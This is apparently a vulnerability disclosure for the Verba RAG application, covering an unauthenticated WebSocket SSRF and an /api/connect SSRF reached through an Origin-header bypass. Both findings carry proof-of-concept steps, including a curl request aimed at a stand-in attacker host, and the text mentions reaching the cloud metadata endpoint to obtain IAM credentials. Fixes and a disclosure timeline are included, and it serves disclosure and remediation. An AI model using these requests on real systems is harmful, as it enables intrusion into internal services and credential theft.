
https://github.com/weaviate/Verba/

# Finding 1: Unauthenticated SSRF in Verba WebSocket import endpoint (HTMLReader)

## Details
Unauthenticated Server-Side Request Forgery (SSRF) vulnerability in the Verba RAG application affecting all published versions (confirmed on commit 6695928, v2.1.3).

## Summary

The WebSocket endpoint at /ws/import_files accepts a full RAG pipeline configuration from the caller. When the HTMLReader is selected, the server fetches each URL in the caller-supplied "URLs" list using aiohttp with no validation. The endpoint applies no authentication, and the HTTP same-origin middleware does not gate WebSocket upgrade requests. An attacker with access to the Verba web port can cause the backend to issue arbitrary HTTP GET requests to any reachable host.

Vulnerable code:

goldenverba/components/reader/HTMLReader.py, fetch_html_and_convert():
  async with session.get(url) as response:   # url is fully attacker-controlled

goldenverba/server/api.py, websocket_import_files() (line 238):
  # No authentication or origin check before accepting the WebSocket

## PoC (validated on Docker compose, commit 6695928):

1. Start a TCP listener: nc -lvp 9545

2. Connect to the WebSocket and send the following (pseudocode; full JSON in advisory):

   ws connect ws://verba-host:8000/ws/import_files
   send: {"chunk": <FileConfig with HTMLReader URLs=["http://attacker:9545/probe"]>,
          "isLastChunk": true, "total": 1, "fileID": "x", "order": 0,
          "credentials": {"deployment": "Docker", "url": "", "key": ""}}

3. Listener receives:
   GET /probe HTTP/1.1
   Host: attacker:9545
   User-Agent: Python/3.11 aiohttp/3.9.5

Internal Weaviate was also successfully reached: the server returned "Loaded http://172.18.0.2:8080/v1/.well-known/ready" confirming the fetch completed against the co-located database.

In cloud deployments an attacker can reach the instance metadata endpoint (169.254.169.254) to retrieve IAM credentials.

Recommended fix: validate the URL scheme and host against an allowlist before calling aiohttp, or remove the ability for unauthenticated callers to specify reader URLs. At minimum, require authentication before accepting WebSocket import connections.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (8.6 High)
CWE-918

## Disclosure
- 2 June 2026 - reported via email
- 8 June 2026 - repo was archived
- 3 July 2026 - disclosed

<img width="1240" height="304" alt="image" src="https://github.com/user-attachments/assets/4e37dcea-f566-4183-8fd9-5c48346d8b44" />

<img width="1019" height="165" alt="image" src="https://github.com/user-attachments/assets/bf2e8ce7-27dd-483d-ac9c-c4977c01664b" />



# Finding 2: SSRF + same-origin middleware bypass in /api/connect -- goldenverba

## Details
Two related vulnerabilities in the Verba RAG application affecting all published versions (confirmed on commit 6695928, v2.1.3).

Issue 1 - Same-origin middleware bypass:

The middleware at goldenverba/server/api.py (lines 82-114) checks whether the Origin header starts with "http://localhost:". This check does not verify the port number. Any caller can send "Origin: http://localhost:99999" to bypass the guard and reach all /api/ endpoints without restriction, regardless of whether they are actually on localhost.

Issue 2 - SSRF via /api/connect:

The /api/connect endpoint accepts {"deployment":"Custom","url":"<host>","key":"","port":"<port>"}. When deployment is "Custom", Verba calls weaviate.use_async_with_local(host=host, port=port) which issues GET /v1/meta to the supplied host:port. No validation is applied. An attacker can supply any reachable host and port.

PoC (validated on Docker compose, commit 6695928):
```
Attacker starts listener: python3 -m http.server 9546

curl -X POST http://verba-host:8000/api/connect \
  -H "Content-Type: application/json" \
  -H "Origin: http://localhost:12345" \
  -d '{"credentials":{"deployment":"Custom","url":"ATTACKER_IP","key":""},"port":"9546"}'

Listener receives:
  GET /v1/meta HTTP/1.1
  Host: ATTACKER_IP:9546
  User-Agent: python-httpx/0.27.0
```

Recommended fixes:

1. Same-origin bypass: compare the full Origin value (including port) against the server's actual base URL. Do not accept all http://localhost:* origins.

2. SSRF: validate that the user-supplied host and port refer to a permitted Weaviate deployment. Consider an allowlist of deployment URLs configurable at startup rather than accepting arbitrary runtime input.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (8.6 High)
CWE-918

## Disclosure
- 2 June 2026 - reported via email
- 8 June 2026 - repo was archived
- 3 July 2026 - disclosed

<img width="1247" height="345" alt="image" src="https://github.com/user-attachments/assets/191a9f5c-3f52-4aaf-932f-6e5a62bb45aa" />
